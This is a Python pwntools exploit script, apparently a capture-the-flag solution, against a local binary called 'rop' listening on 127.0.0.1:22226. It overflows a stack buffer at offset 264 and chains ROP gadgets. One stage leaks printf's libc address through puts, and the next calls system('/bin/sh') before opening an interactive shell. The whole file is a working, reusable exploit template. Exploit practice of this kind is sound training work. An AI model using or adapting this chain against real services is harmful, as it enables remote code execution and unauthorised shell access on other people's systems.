#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['tmux','splitw','-h']

gdbscript = '''
b *main
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################


main_offset = 0x11a9
printf_got_offset = 0x3fc0
pop_rdi_ret_offset = 0x12a3
name_rip_offset = 264
puts_offset = 0x1080
libc_printf_offset = 0x5d7c0

libc_bin_sh_offset = 0x1bd115
libc_system_offset = 0x4f230

io = start()

'''
puts(*libc_printf)

RSP => [    pop_rdi_ret   ]
       [  print_got_addr  ]
       [       puts       ]

'''

main_addr = int(io.recvline(False).split(b":")[1], 0)
exe_addr = main_addr - main_offset
printf_got_addr = exe_addr + printf_got_offset
pop_rdi_ret_addr = exe_addr + pop_rdi_ret_offset
puts_plt_addr = exe_addr + puts_offset

print(f"[!] main address: {main_addr:x}")
print(f"[!] exe address: {exe_addr:x}")
print(f"[!] pop_rdi_ret address: {pop_rdi_ret_addr:x}")
print(f"[!] printf_got address: {printf_got_addr:x}")
print(f"[!] puts_plt address: {puts_plt_addr:x}")

payload = fit({
    name_rip_offset      : pop_rdi_ret_addr,
    name_rip_offset + 8  : printf_got_addr,
    name_rip_offset + 16 : puts_plt_addr,
    name_rip_offset + 24 : main_addr
})

io.recvline()
io.sendline(payload)
io.recvline()

printf_libc_addr = u64(io.recvline(False).ljust(8, b"\x00"))
libc_addr = printf_libc_addr - libc_printf_offset

print(f"[!] printf_libc address: {printf_libc_addr:x}")
print(f"[!] libc address: {libc_addr:x}")

libc_bin_sh_addr = libc_addr + libc_bin_sh_offset
libc_system_addr = libc_addr + libc_system_offset

'''
system(bin_sh)

RSP => [ pop_rdi_ret ]
       [    bin_sh   ]
       [    system   ]
'''

payload = fit({
    name_rip_offset      : pop_rdi_ret_addr,
    name_rip_offset + 8  : libc_bin_sh_addr,
    name_rip_offset + 16 : libc_system_addr,
})

io.recvline()
io.recvline()
io.sendline(payload)
io.recvline()

io.interactive()